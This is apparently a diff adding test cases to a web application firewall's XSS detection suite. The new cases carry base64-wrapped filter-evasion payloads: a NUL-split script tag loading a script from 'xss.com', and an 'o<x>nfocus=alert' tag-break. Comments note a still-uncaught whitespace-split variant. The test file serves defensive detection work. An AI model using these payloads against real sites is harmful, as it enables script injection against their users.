@@ -224,10 +224,56 @@ pub static CASES: &[Case] = &[
         rules: &[],
         desc: "HTML table cells separating onclick/=/fn must NOT be joined into `onclick=` (D2 FP guard)",
     },
-    // NB: §6-D2b (intra-token whitespace, e.g. `<<scr ipt>`) stays DEFERRED — space-collapse
-    // on keywords is high-FP-risk on prose. No corpus case here: the gotestwaf example also
-    // carries `http://xss.com`, which trips rfi-remote-url (sub-threshold) and confounds a
-    // clean "miss" demonstration.
+    // ── §6-D2b: mid-token CONTROL-char strip — NUL-split mutation now CAUGHT ─────────
+    // WIRE ground-truth (pcap bypass-new.txt L14434): `<<scr\0ipt/src=http://xss.com/…>`
+    // is sent Base64Flat in the URL PATH. The raw path is opaque base64, so the §6
+    // transforms used to no-op on it; only after composing them over the base64-DECODED
+    // variant (10c reopen) does the NUL get stripped → `<script` reconstructed.
+    Case {
+        id: "xss-mutation-nul-split-b64-path",
+        module: Module::Xss,
+        field: Field::Path("/PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ"),
+        min_pl: 1,
+        expect: Expect::Triggers,
+        // base64 → `<<scr\0ipt/src=…>` → §6-D2b control-strip → `<<script…` → xss-script-tag.
+        rules: &["xss-script-tag"],
+        desc: "WIRE: Base64Flat `<<scr\\0ipt/src=http://xss.com/xss.js>` in URL path — NUL \
+               mid-token split, closed by §6-D2b control-strip composed over base64-decode",
+    },
+    // ── §6-D2 ∘ base64: the mid-token TAG-strip mutation, but Base64Flat-wrapped ──────
+    // WIRE (pcap bypass-new.txt L13971): `\"autof<x>ocus o<x>nfocus=alert<x>(1)//`
+    // Base64Flat in the URL path. Same composition gap as D2b: the tag-strip must run on
+    // the base64-decoded variant, not the opaque blob. Locks the `derive_variants` compose.
+    Case {
+        id: "xss-mutation-tag-break-b64-path",
+        module: Module::Xss,
+        field: Field::Path("/XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v"),
+        min_pl: 1,
+        expect: Expect::Triggers,
+        // base64 → `o<x>nfocus` → §6-D2 mid-token tag-strip → `onfocus=` → xss-event-handler.
+        rules: &["xss-event-handler"],
+        desc: "WIRE: Base64Flat mutation `o<x>nfocus=alert<x>(1)` in URL path — §6-D2 \
+               tag-strip composed over base64-decode (10c reopen)",
+    },
+    // ── benign guard for §6-D2b: control-strip must not fabricate a keyword ───────────
+    // Uses a NON-NUL C0 control (0x01) so the guard isolates control-strip: `pt-null-byte`
+    // (= `\x00`) deliberately ignores it, so a residual match could ONLY come from the
+    // strip joining fragments — and it must not. (NUL itself is independently flagged by
+    // pt-null-byte, so control-strip adds no marginal FP there.)
+    Case {
+        id: "xss-benign-ctrl-in-base64-text",
+        module: Module::Xss,
+        field: Field::Query { name: "data", value: "cmVwb3J0AWZpbmFsIHN1bW1hcnkgbm90ZXM" },
+        min_pl: 1,
+        expect: Expect::Clean,
+        rules: &[],
+        desc: "benign base64 → `report\\x01final summary notes`; control-strip joins to \
+               `reportfinal …` but reconstructs NO attack keyword → Clean (D2b FP guard)",
+    },
+    // NB: §6-D2b-2 (intra-token WHITESPACE collapse, e.g. `<<scr ipt>`) stays DEFERRED —
+    // space-collapse on keywords is high-FP-risk on prose, and it is NOT on the wire (the
+    // gotestwaf split uses a NUL, handled above). Reopen only with a keyword-anchored,
+    // heavily FP-probed collapse.
     // ── benign / traps ─────────────────────────────────────────────────────────
     Case {
         id: "xss-benign-javascript-prose",
